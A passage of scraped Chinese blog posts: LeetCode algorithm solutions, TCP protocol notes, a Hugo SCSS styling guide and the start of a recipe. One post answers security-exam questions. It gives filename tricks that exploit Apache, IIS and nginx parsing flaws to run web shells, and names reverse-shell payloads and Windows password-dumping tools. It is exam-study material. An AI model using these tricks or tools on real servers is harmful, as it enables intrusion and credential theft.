更高的，所以你可以游向坐标方格中的任意位置\n这道题可以使用变相的SPFA来解决。我们的dist不再是源点到任一点的距离，而是源点到达任一点所需要的时间。对于一个点的邻接点，如果自己的高度比它高，则说明我们到达当前这个点的时候，水面已经没过了这个邻接点；如果自己的高度比它低，说明我们到达当前这个点的时候还没办法到达邻接点，因为至少需要等待水面没过它；所以采用当前这条路径，要到达这个邻接点的时间就是max(grid[tmp.x][tmp.y], distance[head.x][head.y])。\n那么根据SPFA的逻辑，就能得到如下的代码：\nclass Solution { public: typedef struct { int x, y; } Point; int swimInWater(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; grid) { const int n = grid.size(); int visited[51][51] = { 0 }; int distance[51][51]; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { distance[i][j] = n * n; } } // SPFA queue\u0026lt;Point\u0026gt; q; Point head; Point tmp; tmp.x = tmp.y = 0; distance[0][0] = grid[0][0]; q.push(tmp); visited[0][0] = 1; while (!q.empty()) { head = q.front(); q.pop(); visited[head.x][head.y] = 0; // 提供再次入队的可能性 for (const auto [dirx, diry] : dirs) // 对于所有邻接点 { tmp.x = head.x + dirx; tmp.y = head.y + diry; if ( (0 \u0026lt;= tmp.x \u0026amp;\u0026amp; tmp.x \u0026lt; n) \u0026amp;\u0026amp; (0 \u0026lt;= tmp.y \u0026amp;\u0026amp; tmp.y \u0026lt; n) \u0026amp;\u0026amp; distance[tmp.x][tmp.y] \u0026gt; max(grid[tmp.x][tmp.y], distance[head.x][head.y]) ) { distance[tmp.x][tmp.y] = max(grid[tmp.x][tmp.y], distance[head.x][head.y]); if (!visited[tmp.x][tmp.y]) { q.push(tmp); visited[tmp.x][tmp.y] = 1; } } } } return distance[n - 1][n - 1]; } }; 表现一般，主要是由于SPFA算法在稀疏图的情况下表现更好，在这种稠密图中时间复杂度退化了。\nPerformance 这题实际上还是使用Dijkstra算法会好一些，官方还提供了二分答案（思路简单！）、并查集等骚操作，不在本文的讨论范围内。\n参考资料 [1] 力扣官方题解.水位上升的泳池中游泳[EB/OL].2021-01-30\nhttps://leetcode-cn.com/problems/swim-in-rising-water/solution/shui-wei-shang-sheng-de-yong-chi-zhong-y-xm9i/\n[2] SHHHS.SPFA算法[EB/OL].2016-09-14\nhttps://www.cnblogs.com/shadowland/p/5870640.html\n[3] 360百科.宽度优先搜索[EB/OL]\nhttps://baike.so.com/doc/7806949-8081044.html\n","date":"2021-01-30T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode778.-%E6%B0%B4%E4%BD%8D%E4%B8%8A%E5%8D%87%E7%9A%84%E6%B3%B3%E6%B1%A0%E4%B8%AD%E6%B8%B8%E6%B3%B3/","title":"难题本 | LeetCode778. 水位上升的泳池中游泳"},{"content":"\u003c!doctype html\u003e \u0026quot;安全岗笔试题——1\u0026quot; 近期准备安全岗实习的笔试，结果悲伤地证实了我的知识体系中还是存在很多漏洞，在此对我不够熟悉的题目进行记录。\n以下哪些说法是正确的？（）\nA、 iOS系统从iOS6开始引入kernel ASLR安全措施\nB、 主流的iPhone手机内置了AES和RSA硬件加速解密引擎\nC、 安卓系统采用了安全引导链（Secureboot Chain），而iOS系统则未采用\nD、 Android4.1 系统默认启用了内存ASLR\n答案 ABD iOS系统也采用了安全引导链，C错误 以下哪个工具可以用来运行DDoS攻击？（）\nA、 菜刀\nB、 WSI\nC、 Dosend\nD、 Chkrootkit\n答案 C 中国菜刀是一款专业的网站管理软件； WSI是PHP注入工具，具体可以参考这篇文章； Dosend是一款Linux发包工具，可以用来实现DDoS攻击； chkrootkit是用来检查rootkit的。 以下哪些服务器曾被发现文件解析漏洞？（）\nA、 Apache\nB、 IIS\nC、 nginx\nD、 squid\n答案 ABC A、Apache解析漏洞：该服务器从右到左判断解析文件，如果为不可识别解析，就继续往左判断。如shell.php.owf.rar，其中.owf和.rar是Apache不可解析的，就将此文件最终解析为shell.php B、IIS解析漏洞：一是IIS5.x/6.0中，网站下建立名为.asp/.asa的文件夹，其内的任何文件都被当成asp文件解析并执行；二是123.asp;.jpg会被解析为123.asp。 C、nginx解析漏洞：一是nginx默认Fast-CGI开启的情况下，黑客上传名为upupimage.jpg，内容为PHP代码的文件，然后访问upupimage.jpg/.php，在这个目录下就会生成一句话木马shell.php；二是在图片中嵌入PHP代码，然后通过访问xxx.jpg%00.php来执行其中的代码。影响版本0.5,0.6,0.7\u0026lt;=0.7.65,0.8\u0026lt;=0.0.37。 squid爆出来的更多是拒绝服务攻击。它是一个高效的Web缓存及代理程序，最初是为Unix平台开发的，现在也被移植到Linux和大多数的Unix类系统中，最新的Squid可以运行在Windows平台下。 以下哪几种工具可以对网站进行自动化Web漏洞扫描？（）\nA、 hackbar\nB、 AWVS\nC、 IBM appsacn\nD、 nmap\n答案 BC hackbar可以用来快速构建一个HTTP请求、编码解码base64等操作，不能自动化Web漏洞扫描；nmap是一款网络端口扫描工具，可以扫描各种端口及其服务甚至是系统漏洞检测。从它的NSE脚本可以看到它也可以进行Web漏洞扫描，但是需要复杂的配置命令，故不能自动化扫描。 黑客控制一台Windows服务器，发现IE浏览器使用了代理，可以访问外网，执行如下命令发现：\nC:\\Users\\test\u0026gt;ping www.baidu.com -n 1 正在 Pingwww.a.shifen.com [14.215.177.38] 具有32字节的数据： 请求超时\nC:\\Users\\test\u0026gt;telnet www.baidu.com 80 正在链接www.baidu.com…无法打开到主机的连接。 在端口 80: 连接失败。\n通过如上信息判断，一下哪些反弹shell操作会失败\nA、 Windows/meterpreter/reverse_http\nB、 icmp协议的后门\nC、 windows/meterpreter/reverse_https\nD、 windows/meterpreter.reverse_tcp\n答案 ABCD IE浏览器使用了代理，可能HTTP协议会受到防火墙限制，故A不对；ping不通百度说明ICMP协议也受影响。故http、https、icmp协议的反弹shell都会失败，D也是不对的，对方挂了代理，telnet不通，只有通过插入挂了代理的IE进程反弹，或者通过代理反弹. 以下哪些工具可以抓取Windows明文密码？（）\nA、 WCE\nB、 minikatz\nC、 Quarks PWdump\nD、 CAIN\n答案 AB A、WCE是与gethashes和mimikatz齐名的一款hash管理工具，使用wce进行本地和域的hash注入，可以在高权限下获取明文密码 B、法国一个牛B的人写的轻量级调试器，可以帮助安全测试人员抓取Windows密码。mimikatz 2.0版本，抓密码命令更加简单了，新功能还包括能够通过获取的kerberos登录凭据，绕过支持RestrictedAdmin模式的win8或win2012svr的远程终端(RDP)的登陆认证 C、一个Win32环境下的系统授权信息导出工具，目前除此之外没有任何一款工具可以导出如此全面的信息，支持这么多的OS版本，且相当稳定。 D、CAIN主要用于网络数据嗅探，也带有密码破解功能，但是不能抓取windows明文密码 iOS平台上常见的Hook框架有（）\nA、 Xposed\nB、 Intent Fuzz\nC、 Drozer\nD、 Substrate\n答案 D A/ 这个是android的hook框架，有不少开发者发布了不错的框架。 B/ 这个是android 应用组件模糊测试框架 C/ 这个是android 综合渗透测试平台 D/ IOS平台的hook的框架。此外，Cydia Substrate是android上的强大而实用的HOOK工具 执行nmap 10.5.5.1默认会扫描以下哪个端口（）\nA、 21\nB、 3389\nC、 8080\nD、 1024\n答案 AC nmap默认扫描选项是对常规端口和服务进行探测。其中常规端口是1000个最可能开放的端口。 【判断】TCP和UDP相比，TCP传送数据更安全（）\n答案 错。可靠传输不等于更加安全，两者实际上不存在哪个更安全的对比。 题目来源 [1] daxi0ng.腾讯2016实习招聘-安全岗笔试题答案详细解释[EB/OL].2019-03-13\nhttps://blog.csdn.net/qq_40989258/article/details/88532712\n\u0026nbsp;\n","date":"2021-01-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%981/","title":"安全岗笔试题——1"},{"content":"传输层 传输层的功能\n从通信和信息处理的角度看，传输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。\n实际上，传输层起到一个承上启下的作用。它之下的网络层、数据链路层、物理层被称为通信子网，其实现细节对用户是不可见的。\n传输层的功能如下：\n提供进程之间的逻辑通信（即端到端的通信）。进程间的逻辑通信是指本主机上运行的某个进程和对方主机上运行的某个进程进行通信。而与此相对的，网络层提供的是点到点的通信，指的是本主机与对方主机的通信。 复用和分用。多个进程可以使用同一个传输层协议封装自己的数据，而对方主机可以使用同样的协议正确解析这些数据，交付给正确的应用进程。 差错检测。传输层检测首部和数据部分的差错，而网络层只检查IP数据报的首部，不检查数据部分是否出错。 提供两种不同的传输协议，即面向连接的TCP和无连接的UDP。网络层无法同时实现两种协议（即要么使用面向连接的服务，如虚电路；要么只提供无连接的服务，如数据报）。 需要注意，在计算机网络层次结构中，网络层被认为是不可靠的服务，即网络层传输的数据可能出现丢失、混乱或重复，这些不可靠的问题需要由传输层来考虑解决。\n端口的概念\n网络层的数据交付是点到点的，也就是主机到主机的交付。当一个IP数据报到达了主机，如何判断这份数据报应该交给哪个进程呢？传输层引入了端口，每个进程与一个端口号绑定。主机把IP数据报解封，就能看到里面的传输层数据包，其包头中写明了目的端口，只需要把数据交付给对应于这个端口的进程即可。\n结合IP和端口，就能唯一地标识一台主机上的一个进程，这就是Socket（套接字）：\n套接字 = （主机IP地址， 端口号）\nTCP TCP协议的特点\nTCP是在不可靠的IP层之上实现的可靠的数据传输协议，它主要针对之前提及的网络层数据传输的丢失、混乱或重复问题，实现传输层上的可靠、有序、无丢失和不重复。\nTCP的主要特点如下：\n面向连接。 每条连接只能有两个端点，即一对一的。 可靠的交付服务，保证数据无差错、不丢失、不重复且有序。 全双工通信，即任何时刻双方都能进行数据的发送。为此，双方都应该设置发送缓存和接收缓存，用来临时存放双向通信的数据。 面向字节流。计算机网络中常见的一个问题是：面向字节和面向报文有什么区别？ 面向字节流是指TCP将应用程序交付下来的数据仅视为一连串的无结构的字节流，发送的时候按照TCP的规则进行发送，不会考虑保留原始数据的边界；而面向报文是指每次发送的数据作为一个报文，一个报文是一块有结构的数据。 TCP报文段\n想要理解TCP的连接建立等等细节，认识其报头是必要的。TCP有固定的20B报头，变长字段配合填充字段使TCP报头长度始终是4B的整数倍。由于首部长度字段只有4位，故报头最长为15 * 4 = 60B\nTCP报头格式如下：\nTCP Header 每个字段的含义可以参见这篇文章。\nTCP连接管理\nTCP是面向连接的协议，每个TCP连接都有三个阶段：连接建立、数据传输和连接释放。TCP的连接管理就是使运输连接的建立和释放都能正常进行。\nTCP连接的端口称为套接字（socket）或插口。连接采用C/S方式，主动发起连接的进程称为客户机（Client），被动等待连接的进程称为服务器（Server）。\n连接的建立分为3个步骤，即三次握手：\nTCP three-way-handshake 第一步：客户机向服务器发送一个报文段，该报文段不含应用层数据，首部中的SYN标志被置为1，且该报文段占用了一个随机序号seq=x。 第二步：服务器收到连接请求，如同意连接，就向客户机发回确认，并为该连接分配TCP缓存和变量。确认报文中SYN和ACK都置为1，seq是服务器选用的初始随机序号，ack表示期望收到的下一个客户机报文序号。 第三步：客户机接收到确认报文，也要为该连接分配缓存和变量，并回复确认。 完成三次握手之后，双方的应用进程在任何时刻都可以发送数据（全双工）。\n注意这里的第二步握手，服务器在此步分配资源，那么如果客户端不回应第三步的确认报文，则服务器在原地忙等，过一段时间后才删除这些资源；如果快速发送大量的SYN包给特定服务器，将耗尽它的资源，使得正常的连接无法被建立，这就是典型的SYN Flood攻击。\n三次握手的必要性：\n进行三次握手是必要的。\n从直觉进行理解：第一步握手是客户端向服务器发送数据，此时双方对信道的性质还不了解；第二步握手成功之后，客户端知道了服务器能够收到自己的数据，但服务器还不知道客户端能不能收到自己的数据；第三步握手成功之后，服务器知道客户端能收到自己的数据，可以开始通信。\n进一步地，考虑以下这种两次握手的情况：\nTCP 2-way-handshake-bug1 在第二步握手时，服务器回应的报文段没有被客户机收到，而此时服务器认为连接已经建立（因为对服务器来说第二步握手已经完成了），开始发送数据；服务器发送的数据到达客户机，但客户机并不知道自己的连接已经建立，这里的seq字段是违法的，丢弃这些包；服务器超时重传，客户端继续丢弃。\n当然，对于客户机来说，连接迟迟无法建立，应当重新发送SYN包，而对于服务器来说，与这个客户端的连接已经存在了，故对后来的连接请求不予响应。\n不妨再考虑下面这种情况：\nTCP 2-way-handshake-bug2 当客户机发送一个SYN包，该请求在网络中某个节点长时间滞留，客户机超时之后认为报文丢失，重传一次请求，服务器收到之后建立连接，开始传输数据。\n数据传输完毕之后双方断开连接，而此时，前一个滞留在网络中的连接请求到达服务器，服务器认为客户机又请求建立连接。此时，如果使用两次握手，服务器认为连接建立，而客户机实际上并没有发起连接请求，因此不予理睬，造成了服务器资源的浪费。\n数据传输完成之后，需要断开连接。如果你有注意到上图中的FIN报文段，需要留心，那只是个断开连接的示意，其中并没有展现“四次挥手”的过程。\n而真正的“四次挥手”过程如下图：\nTCP 四次挥手 第一步：客户机打算关闭连接时，向服务器发送一个连接释放报文段，其中FIN标志位设置为1,同样占用一个序号即seq=x（这里的x与之前三次握手的x无关，只是一种表示）。此时发送FIN的一端不能再发送数据，但可以发送控制信息，可以接收数据。 第二步：服务器收到连接释放报文段之后发出确认。此时客户机到服务器方向的连接就释放了，但服务器还能发送数据，客户机仍要接收。 第三步：服务器数据也发送完毕，向客户机发出FIN=1的报文段。 第四步：客户机收到连接释放报文段后，发出确认。发出确认后连接还没有释放，必须等待计时器设置的时间2MSL后才进入关闭状态。 等待2MSL的必要性：\n第四步中客户机发出ACK之后需要等待2MSL才进入关闭状态。MSL（Maximum Segment Life）是指一个报文段在网络中存留的最长时间。等待的目的是为了保证服务器收到自己的ACK。\n在第三步中，服务器发出了FIN，但是此时并不能释放此次连接的资源，而要确保客户机收到了自己的FIN。\n客户机在第四步发出的ACK只有以下两种情况：\n客户机发出的ACK到达了服务器，则服务器认为连接关闭，立即释放资源； 客户机发出的ACK没有到达服务器，那么服务器知道自己的FIN没有被收到，应该超时重传。 显然，在第二种情况中，如果服务器进行了FIN的重传，而客户机在发出ACK之后就先行释放了资源，那就造成了错误。\n于是，客户机在发出ACK后等待2MSL的时间：\n2MSL = 自己的ACK的最大存活时间 + 重传的FIN的最大存活时间\n简而言之，在第四步发出ACK之后，如果ACK没有到达，那么在2MSL时间内一定能收到对方重传的FIN，从而可以继续响应ACK；若2MSL时间内都没有收到任何信息，那么自己的ACK一定已经到达，连接可以正常关闭。\nTCP可靠传输\nTCP的任务是在IP层不可靠的、尽力而为服务的基础上建立一种可靠数据传输服务，其使用了校验、序号、确认和重传等机制来达到这一目的。\n校验\nTCP的校验机制和UDP是一样的。计算校验和时要在TCP/UDP数据报之前增加12B的伪首部，伪首部并不是真正的数据报首部，不实际发送，只是参与校验和的计算而已。添加了伪首部之后的数据报如下：\n添加伪首部的临时数据报 校验和的计算方法是：将临时数据报视为许多16位的字链接起来，末尾不足则用0填充。使用二进制反码计算出这些16位字的和，并将此和的二进制反码写入真正数据报头部的校验位字段。\n序号\nTCP首部的序号字段用来保证数据能有序提交给应用层，TCP把数据视为一个无结构但有序的字节流，序号建立在传送的字节流之上，而不建立在报文段之上。\nTCP连接传送的数据流中每个字节都编上一个序号。序号字段的值是本报文段所发送的数据的第一个字节的序号。例如一段数据有10个字节，分两个数据报传送，第一个数据报序号为0，包含0~5个字节，则第二个数据报的序号为6。\n确认\nTCP首部的确认号是期望收到对方的下一个报文序号。按照上面的例子，如果对方收到了第一个数据报（序号0，包含0~5个字节），则返回的ack=6。\nTCP默认使用累计确认，即TCP只确认数据流中至第一个丢失字节为止的字节。\n重传\n重传对于拥塞控制是比较重要的机制。有两种事件会导致TCP对报文进行重传：超时和冗余ACK。\n超时\nTCP每发送一个报文段，就要对这个报文段设置一次计时器。计时器超时后要对这个报文进行重传。\n由于TCP的下层是一个互联网环境，IP数据报所选择的路由变化时刻影响传输层的往返时延。TCP的超时重传时间基于发送方测量得到的平均往返时间，具体细节不在本文讨论范围内。\n冗余ACK\n超时重传存在的问题是显然的：周期太长。而冗余ACK使得发送方可以在超时之前注意到丢包现象的存在。冗余ACK就是再次确认某个报文段的ACK，而发送方先前已经收到过该报文段的确认。例如，发送方A发送了序号为1/3/5/7/9的报文段，而3号报文在传输过程中丢失。对于接收方B，它收到1号报文后接下来需要的是3号报文，而收到5号、7号、9号报文之后发现这些报文并不是当前需要的报文，于是发送3个对3号报文的ACK。TCP规定当发送方收到对同一个报文的3个冗余ACK时，就可以认为跟在这个被确认报文段之后的报文段已经丢失。\nTCP流量控制\n注意流量控制和拥塞控制的本质区别：流量控制是指点对点的通信量的控制，其根本目的是使发送方的发送速率和接收方的接收速率匹配；拥塞控制是让网络能够承担现有的网络负荷，是一个全局性的过程，涉及所有的主机、所有的路由器，以及与降低网络传输性能有关的所有因素。\nTCP的发送端和接收端都维护发送窗口和接收窗口，接收方可以设置TCP头部的窗口字段来告诉发送方自己的窗口大小，使发送方对发送窗口进行动态调整。\nTCP拥塞控制\n发送方除了使自己发送的数据能够吻合接收端的接收速率之外，还需要考虑自己的发送速率对网络的影响。当网络负载较大的时候，发送速率应该减小，以免加重网络的负载。\n因此，发送方需要维护以下两个窗口：\n接受窗口rwnd，反映接收方的容量； 拥塞窗口cwnd，根据自己估算的网络拥塞程度设置的窗口值，反映网络的当前容量。 显然，真正的发送窗口大小 = min(rwnd, cwnd)。\n为了更好地对传输层进行拥塞控制，因特网建议标准定义了4种算法：慢启动、拥塞避免、快重传、快恢复。\n慢启动\n在TCP刚刚连接好并开始发送TCP报文段时，先令拥塞窗口cwnd = 1，即刚开始时只能发送一个最大报文段（MSS）。\n每经过一个传输轮次（经过一次往返时延RTT之后），拥塞窗口加倍，在这种算法下cwnd的大小指数式增长。我们从一开始就需要规定一个慢开始门限ssthresh，即阈值，拥塞窗口大小一直指数增长到这个阈值之后，改用拥塞避免算法。\n拥塞避免算法\n拥塞避免算法要求：\n发送端的拥塞窗口cwnd每经过一个往返时延RTT就增加一个MSS的大小。在这种算法下cwnd按线性规律缓慢增长（加法增大）； 每当出现一次超时，令慢开始门限（阈值）等于当前cwnd的一半（乘法减小），然后将cwnd设置为1，重新慢启动。 慢启动和拥塞避免的实现过程如下：\n慢启动和拥塞避免 注意在慢开始（指数增长）阶段，若2 * cwnd \u0026gt; ssthresh，则下一个RTT的cwnd 等于ssthresh；即cwnd不能跃过ssthresh值。\n快重传\n先前提过，发送端收到连续三个冗余ACK时，就能进行重传，而不必等待计时器超时。此即“快重传”。\n快恢复\n快恢复是为了配合快重传而定义的算法。它规定：发送端收到连续三个冗余ACK时执行“乘法减小”算法，即将慢开始门限设置为此时cwnd的一半，然后把cwnd的值设置为改变后的阈值，直接进行加法增长。\n显然，快恢复不需要cwnd从1开始时的慢启动过程，所以它比较“快”。\n两种算法实现的比较如下：\n快恢复算法的实现过程 为什么快重传要搭配快恢复？\n在拥塞避免算法中，重传的情况是计时器超时，说明此时不管是自己的数据报还是对方的ACK都已经无法送达，网络的负载已经很大，直接将自己的拥塞窗口减成1，是一种比较高效的限流措施；\n在快重传情况下，能够收到三次冗余ACK，说明网络中还是能够通过一些数据报的，此时将拥塞窗口减半，直接开始拥塞避免算法（加法增长），对性能的影响较小。\n小结 本文对重要的传输层协议——TCP进行了较为全面的梳理，包括TCP报文段格式、TCP连接管理、TCP可靠传输、流量控制和拥塞控制。\n本文多数内容来自参考资料[2]，少数内容来自网络，对部分知识点进行了补充。参考资料难免不够全面，对本文中的内容有任何疑问处请在评论区留言。\n参考资料 [1] 车小胖.为什么TCP4次挥手时等待为2MSL？[EB/OL].2017-10-23\nhttps://www.zhihu.com/question/67013338\n[2] 王道论坛.2021年计算机网络考研复习指导[M].北京:电子工业出版社,2020:209-246\n[3] 李卓航.TCP的三次握手与四次挥手理解及面试题（很全面）[EB/OL].2019-06-29\nhttps://www.cnblogs.com/bj-mr-li/p/11106390.html\n[4] 小狼的世界.Wireshark使用入门[EB/OL].2019-06-23\nhttps://www.cnblogs.com/cocowool/p/wireshark_tcp_http.html\n[5] sean-zou.TCP报文格式[EB/OL].2014-06-10\nhttps://blog.csdn.net/a19881029/article/details/29557837\n","date":"2021-01-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AEtcp/","title":"传输层协议——TCP"},{"content":"题目链接：https://leetcode-cn.com/problems/regions-cut-by-slashes/\n令我思考很久的一道题，最后还是学着官方题解做出来的([1])。思考过程中也想过并查集，然而并没有想到题解中的做法；想到过求一个图中环路的个数，然而不会。\n题目 在由 1 x 1 方格组成的 N x N 网格 grid 中，每个 1 x 1 方块由 /、\\ 或空格构成。这些字符会将方块划分为一些共边的区域。\n（请注意，反斜杠字符是转义的，因此 \\ 用 \u0026ldquo;\\\\\u0026rdquo; 表示。）。\n返回区域的数目。\n分析 将单元格进一步细分，便于并查集操作。\n每个单元格对角点互连，即可分成四个小三角形（图1），根据本格中的字符是/还是\\，合并不同的小三角形。\n图1. 单元格划分 格内合并\n当本格字符为空格时，所有小三角形处于同一个区域中，全部合并； 当本格字符为/时，合并0号和3号，合并1号和2号，且这两个区域不互通； 当本格字符为\\时，合并0号和1号，合并3号和2号，且这两个区域不互通。 格间合并\n格间合并是指单元格之间的小三角形合并。无论本单元格中的字符是什么，当前单元格的1号三角形和右边单元格的3号永远处于同一个区域，当前单元格的2号和下边单元格的0号永远处于同一个区域。同理考虑左边和上边单元格。 我们要遍历所有的单元格，故格间合并只需要顾及左右两侧邻居之一、上下两侧邻居之一即可；例如对于每个单元格只考虑与其右边单元格和下边单元格的合并，每个单元格都如此，则所有单元格都能正常完成合并。 最终操作\n遍历每个单元格，按照字符进行格内合并；如果右边和下边有邻居就进行格间合并。这样最后剩下的独立并查集个数就是最终划分得到的区域数。 这种方式的关键在于格间合并，无论格内字符是什么，格间的联通总能使得离散的区域聚到一起。 模拟 考虑对于示例4：\n输入：[\u0026quot;/\\\\\u0026quot;,\u0026quot;\\\\/\u0026quot;] 输出：5 网格如下：\n图2. 网格 我们从左上到右下进行遍历。\n首先第一个单元格进行格内合并：\nStep1 第一个单元格的格间合并，从此图中就不难看出格间合并的规律与格内字符无关。\nStep2 第二个单元格的格内合并：\nStep3 格间合并，此时它已经没有右邻居：\nStep4 第三、第四个单元格分别格内、格间合并，最终得到的各个独立集合如下：\nFinal AC代码 将上面的模拟转化成代码，其关键在于单元格和小三角形的表示。我们将二维的网格拉直，则一个坐标(x, y)的单元格位于一维数组中的n * x + y处；每个单元格分为4个小三角形，故一个单元格占据4个数组空间。\n最终，坐标(x, y)的单元格位于4 * (n * x + y)到4 * (n * x + y) + 3的下标位置。\n则最终的一维数组即并查集需要开辟的大小为4 * n * n。\nclass UnionFind { private: int f[10000]; int cnt; public: UnionFind(int n) { for (int i = 0; i \u0026lt; 4 * n * n; i++) { f[i] = i; } cnt = 4 * n * n; } int getCnt() { return cnt; } int find(int n) { if (f[n] == n) return n; f[n] = find(f[n]); return f[n]; } void Union(int a, int b) { int ra = find(a); int rb = find(b); if (ra == rb) return ; else if (ra \u0026lt; rb) f[rb] = ra; else if (ra \u0026gt; rb) f[ra] = rb; // cout \u0026lt;\u0026lt; \u0026#34;Union \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#34; with \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; cnt--; return ; } }; class Solution { public: int regionsBySlashes(vector\u0026lt;string\u0026gt;\u0026amp; grid) { int n = grid.size(); UnionFind uf(n); for (int x = 0; x \u0026lt; n; x++) { for (int y = 0; y \u0026lt; n; y++) { int base = 4 * (x * n + y); // 0,4,8,... /* 格内合并 */ if (grid[x][y] == \u0026#39; \u0026#39;) { uf.Union(base, base + 1); uf.Union(base, base + 2); uf.Union(base, base + 3); } else if (grid[x][y] == \u0026#39;/\u0026#39;) { uf.Union(base, base + 3); uf.Union(base + 1, base + 2); } else if (grid[x][y] == \u0026#39;\\\\\u0026#39;) { uf.Union(base, base + 1); uf.Union(base + 2, base + 3); } /* 格间合并 */ if (y \u0026lt; n - 1) // 还有右邻居 uf.Union(base + 1, base + 7); // 己方1，右邻居3 if (x \u0026lt; n - 1) // 还有下邻居 uf.Union(base + 2, base + 4 * n); // 己方2，下邻居0 } } return uf.getCnt(); } }; 表现还不错，叉会儿腰。\nPerformance 参考资料 [1] 力扣官方题解.由斜杠划分区域[EB/OL].2021-01-24\nhttps://leetcode-cn.com/problems/regions-cut-by-slashes/solution/you-xie-gang-hua-fen-qu-yu-by-leetcode-s-ztob/\n","date":"2021-01-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode959.-%E7%94%B1%E6%96%9C%E6%9D%A0%E5%88%92%E5%88%86%E5%8C%BA%E5%9F%9F/","title":"难题本 | LeetCode959. 由斜杠划分区域"},{"content":"总不能让这个博客老是在记录家常菜啊。\n本篇主要介绍hugo博客的进阶美化方法，根据本篇的讲解，结合自己的主题进行实践，有助于打造一个真正属于自己的博客。\n1. CSS和SCSS CSS（层叠样式表）是一种用来表现HTML或XML等文件样式的计算机语言。CSS的存在使得HTML页面源码可以更专注于网页架构的设计，而不用在源码中加入许多关于样式的字段，极大地提高了代码的可读性和简洁性，同时，使得网页样式变得更好维护。\nSass（Syntatically Awesome Style Sheets）是一种CSS预处理器，它可以用来定义一套新的语法规则和函数，以加强和提升CSS。\n举例来说，一个页面中可能需要用到许多次颜色#000，即白色；在原始的CSS代码中这个#000需要不断地出现在各个位置，如color: #000、background: #000等，这就为样式的改变带来了麻烦，假如我们需要整体性地改变页面颜色主题，就只能找到所有的#000并将其修改，实在不够方便。而Sass引入了变量，其概念和C/C++等语言中的变量并无二致，极大地简化了数值的维护。现在可以使用如下的写法来设置页面颜色：\n$WHITE: #000; /* 设置变量 */ .code { background: $WHITE; } .header { color: $WHITE; } 然而，最初的Sass的语法规则和CSS有太多的出入，后来官方在2010年推出了一个全新的语法，叫做SCSS（Sassy CSS），试图弥合Sass和CSS之间的差别。现在我们看到的代码多数已经是SCSS，而其灵魂就是变量，如此理解便好。\n2. hugo和SCSS hugo支持SCSS，因此你所能见到的较为现代的主题多是使用SCSS来定义样式。\n你的网站样式存放在根目录下asset/css文件夹中，不同的主题可能有不同的组织形式，其结构总体上类似于一个分工良好的C/Python程序——各个部位的样式分成各个独立的文件来进行定义，最终使用一个主文件将各个模块include/import进来，实现完整的页面样式。\n我的KeepIt主题有一个内容如下的主文件，功能正如我所述：\nmain.scss 按照import的顺序，HTML文档中的各个标签、各个Class都被其相应的文件赋上了特定的样式，最终形成了一个和谐美观的主题。\n如果你了解CSS，应该知道CSS中的“覆盖”原则，即对于同一个选择器，其后面的属性会覆盖先前出现的属性。比如对于名为str的类，我们的CSS文件中存在两种定义：\n/* line 11 */ .str { color: #efefef; } ... /* line 20 */ .str { color: #ffdab9; } 那么，位于20行的定义会覆盖位于11行的定义，使得具有str类的标签内容呈现#ffdab9这种颜色。\n这种覆盖原则就是我们自定义hugo样式的基础。\n3. 精确定义样式 基于上面提到的覆盖原则，我们能够对指定的选择器进行多次的样式定义，而最终效果以最后一次定义为准，类似于变量的多次赋值。\n在我所知道的hugo主题中，asset/css目录中都有_custom.scss文件，这个文件就是让用户自定义样式的地方。至于为什么可以用这个文件实现样式的自定义，我们可以重新看看main.scss的最后几行：\nmain.scss的最后几行 可以看到，最后一行引入了_custom.scss文件，这使得定义在其中的样式位于最终CSS文件的末尾，其中重复定义的样式会被作为页面的最终效果。\n于是我们的问题就变得很简单了：找到你希望修改的元素和它对应的选择器，重新定义这个选择器即可。\n所幸，现代浏览器为我们提供的开发者工具使得这一切都变得无比简单。以Edge Beta为例，按下F12弹出开发者工具，使用左上角的小箭头使你的鼠标变成一个查看器，现在你点击页面上的任何元素，立即可以在右边的窗口看到这个元素对应的源码。\n例如，在我的博客中有这样的元素已经让我不爽很久了：\n精确选取元素 可以看到跟这个project相同的aboutme.md这个单词被拆成了两半，真是岂有此理。\n现在我们希望这样的元素以后都单独位居一行。可以在右边开发者工具的下半部分看到这个元素对应的CSS，试着改改它的样式，结果真是令人高兴！\n在开发者工具中修改样式 效果 在这里，我将此类元素的background变深了一些；直接用鼠标在最后一行的位置单击，就可以新加入一个white-space: nowrap;的样式，这使得此类元素被强制不换行，看着真是舒服多了！\n效果已经这么好了，我们不妨就将这部分代码（选择器+样式）直接放入_custom.scss，那么理论上来说，这部分样式将覆盖主题原有的效果：\n在SCSS文件中修改样式，包括暗黑模式的样式 使用hugo server在本地试试，Hmm\u0026hellip;Not bad！\n本地效果 本地效果（黑） 以上就是本篇的全部内容。\n参考文献\n[1] 新西兰程序员.CSS,Sass,SCSS关系[EB/OL].2018-10-10\nhttps://www.cnblogs.com/wphl-27/p/9765647.html\n[2] 选择远方.css强制不换行[EB/OL].2019-03-11\nhttps://blog.csdn.net/qq_40713392/article/details/88411432\n[3] 百度百科.CSS（层叠样式表）[EB/OL]\nhttps://baike.baidu.com/item/CSS/5457?fr=aladdin\n","date":"2021-01-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%973/","title":"博客搭建指南——3"},{"content":"家常菜记录第二篇。\n鸭肉又干又柴，丝瓜食之无味，两者结合倒是有不错的效果。\n食材\n瘦鸭肉切成片状（不在图中），大蒜少许，胡萝卜若干，丝瓜一盆。\n食材 制作流程\n1. 油炸鸭肉\n首先将鸭肉片裹上木薯粉（或者炸粉），不必太多，使得肉看起来仍是肉色，放置片刻； 锅底放入适量油； 